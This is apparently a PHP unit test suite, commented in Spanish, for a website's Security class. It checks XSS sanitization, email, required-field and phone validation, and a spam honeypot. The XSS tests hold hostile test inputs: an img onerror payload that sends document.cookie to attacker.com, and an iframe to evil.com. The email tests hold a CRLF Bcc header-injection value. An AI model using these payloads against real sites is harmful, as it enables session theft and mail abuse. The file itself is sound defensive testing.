<?php
/**
 * PMO SOLUTIONS - Unit Test Suite: Security & Validation (MVC Architecture)
 * 
 * Valida las funciones de seguridad y sanitización bajo el Namespace App\Core\Security.
 *
 * Ejecución:
 * php tests/SecurityTest.php
 */

require_once __DIR__ . '/../app/Core/Autoloader.php';
App\Core\Autoloader::register();

use App\Core\Security;

class SecurityTest {

    private int $passed = 0;
    private int $failed = 0;
    private array $errors = [];

    public function runAll(): void {
        $this->printHeader("SUITE DE PRUEBAS UNITARIAS: SECURITY & HARDENING (ARQUITECTURA MVC)");

        $this->testSanitizationAgainstXSS();
        $this->testEmailValidation();
        $this->testRequiredFieldsValidation();
        $this->testPhoneValidationAndHoneypot();

        $this->printSummary();
    }

    public function testSanitizationAgainstXSS(): void {
        $this->printSection("1. Pruebas de Sanitización de Entradas y Mitigación XSS");

        $xssPayload1 = "<script>alert('XSS Attack');</script>Hola PMO";
        $clean1 = Security::cleanString($xssPayload1);
        $this->assert(
            strpos($clean1, '<script>') === false && strpos($clean1, 'alert') !== false,
            "Eliminación de etiquetas <script> en cleanString()",
            "Entrada: {$xssPayload1} | Salida: {$clean1}"
        );

        $xssPayload2 = '<img src="x" onerror="document.location=\'http://attacker.com/steal?cookie=\'+document.cookie">';
        $clean2 = Security::cleanString($xssPayload2);
        $this->assert(
            strpos($clean2, '<img') === false && strpos($clean2, 'onerror') === false,
            "Eliminación de etiquetas <img> y vectores de ataque DOM en cleanString()",
            "Entrada: {$xssPayload2} | Salida: {$clean2}"
        );

        $xssPayload3 = "Mensaje legítimo\n<iframe src=\"evil.com\"></iframe>\nLínea 2 con caracteres & \" '";
        $clean3 = Security::cleanMultiline($xssPayload3);
        $this->assert(
            strpos($clean3, '<iframe') === false && strpos($clean3, '&amp;') !== false,
            "Limpieza de iframes y escape de caracteres HTML en cleanMultiline()",
            "Entrada: [Payload Multilínea] | Salida: {$clean3}"
        );

        $longPayload = str_repeat('A', 300);
        $clean4 = Security::cleanString($longPayload, 50);
        $this->assert(
            mb_strlen($clean4, 'UTF-8') === 50,
            "Truncado estricto al límite configurado (50 caracteres) para prevenir desbordamientos",
            "Longitud final: " . mb_strlen($clean4, 'UTF-8')
        );
    }

    public function testEmailValidation(): void {
        $this->printSection("2. Pruebas de Validación de Formato de Correo Electrónico");

        $validEmails = [
            'contacto@pmo-solutions.com',
            'gerencia.proyectos@constructora.com.pe',
            'ing.luis.ruiz+certificaciones@empresa.org',
            'cliente_nec4@gobierno.gob.pe'
        ];

        foreach ($validEmails as $email) {
            $isValid = Security::validateEmail($email);
            $this->assert(
                $isValid === true,
                "Aceptación de correo corporativo legítimo: '{$email}'"
            );
        }

        $invalidEmails = [
            'correo_sin_arroba.com',
            'usuario@',
            '@dominio.com',
            'usuario@dominio',
            'usuario@.com',
            'usuario@dominio..com',
            '',
            '   ',
            "admin@empresa.com\r\nBcc:spam@malicioso.com",
            str_repeat('a', 151) . '@dominio.com'
        ];

        foreach ($invalidEmails as $email) {
            $isValid = Security::validateEmail($email);
            $this->assert(
                $isValid === false,
                "Rechazo de correo inválido: '" . addcslashes($email, "\r\n") . "'"
            );
        }
    }

    public function testRequiredFieldsValidation(): void {
        $this->printSection("3. Pruebas de Validación de Campos Obligatorios");

        $requiredRules = [
            'nombre'   => 'Nombre Completo',
            'email'    => 'Correo Electrónico',
            'telefono' => 'Teléfono',
            'mensaje'  => 'Mensaje'
        ];

        $validData = [
            'nombre'   => 'Ing. Carlos Mendoza',
            'email'    => 'carlos.mendoza@constructora.pe',
            'telefono' => '+51 987654321',
            'mensaje'  => 'Solicito información para el programa de formación NEC4.'
        ];
        $errorsA = Security::validateRequired($validData, $requiredRules);
        $this->assert(
            empty($errorsA),
            "Pasa exitosamente cuando todos los campos requeridos están completos"
        );

        $missingData = ['nombre' => 'Carlos Mendoza'];
        $errorsB = Security::validateRequired($missingData, $requiredRules);
        $this->assert(
            count($errorsB) === 3 && isset($errorsB['email'], $errorsB['telefono'], $errorsB['mensaje']),
            "Rechaza y genera error en campos omitidos (email, teléfono, mensaje)"
        );

        $whitespaceData = [
            'nombre'   => '   ',
            'email'    => '       ',
            'telefono' => "\t  \n ",
            'mensaje'  => '    '
        ];
        $errorsC = Security::validateRequired($whitespaceData, $requiredRules);
        $this->assert(
            count($errorsC) === 4,
            "Rechaza campos que contienen únicamente espacios en blanco o tabuladores"
        );
    }

    public function testPhoneValidationAndHoneypot(): void {
        $this->printSection("4. Pruebas Complementarias: Honeypot Anti-Bot y Teléfono");

        $humanPost = ['nombre' => 'Usuario Real', 'website_hp' => ''];
        $botPost   = ['nombre' => 'Spam Bot', 'website_hp' => 'http://viagra-spam-link.ru'];

        $this->assert(
            Security::checkHoneypot($humanPost) === true,
            "Honeypot: Acepta formulario legítimo de usuario (campo trampa 'website_hp' vacío)"
        );

        $this->assert(
            Security::checkHoneypot($botPost) === false,
            "Honeypot: Bloquea automáticamente formulario completado por bot de spam"
        );

        $this->assert(
            Security::validatePhone('+51 944 276 649') === true,
            "Validación de teléfono internacional (+51 944 276 649)"
        );

        $this->assert(
            Security::validatePhone('123') === false,
            "Rechazo de número con longitud insuficiente (< 6 dígitos)"
        );
    }

    private function assert(bool $condition, string $testName, string $details = ''): void {
        if ($condition) {
            $this->passed++;
            echo "  \033[32m✔ [PASS]\033[0m {$testName}\n";
        } else {
            $this->failed++;
            $msg = "  \033[31m✖ [FAIL]\033[0m {$testName}";
            if ($details) {
                $msg .= " -> \033[33m{$details}\033[0m";
            }
            echo "{$msg}\n";
            $this->errors[] = $testName;
        }
    }

    private function printHeader(string $title): void {
        echo "\n======================================================================\n";
        echo " {$title}\n";
        echo "======================================================================\n";
    }

    private function printSection(string $title): void {
        echo "\n--- {$title} ---\n";
    }

    private function printSummary(): void {
        $total = $this->passed + $this->failed;
        echo "\n======================================================================\n";
        echo " RESUMEN DE RESULTADOS DE PRUEBAS\n";
        echo "======================================================================\n";
        echo " Total de pruebas ejecutadas: {$total}\n";
        echo " Pruebas exitosas (PASS)    : \033[32m{$this->passed}\033[0m\n";
        echo " Pruebas fallidas (FAIL)    : " . ($this->failed > 0 ? "\033[31m{$this->failed}\033[0m" : "\033[32m0\033[0m") . "\n";
        
        if ($this->failed === 0) {
            echo "\n \033[32m✓ TODAS LAS PRUEBAS DE SEGURIDAD Y VALIDACIÓN PASARON SATISFACTORIAMENTE.\033[0m\n\n";
        } else {
            echo "\n \033[31m✗ SE DETECTARON FALLOS EN LAS SIGUIENTES PRUEBAS:\033[0m\n";
            foreach ($this->errors as $err) {
                echo "   - {$err}\n";
            }
            echo "\n";
        }
    }
}

if (php_sapi_name() === 'cli' || !isset($_SERVER['REQUEST_METHOD'])) {
    $test = new SecurityTest();
    $test->runAll();
}

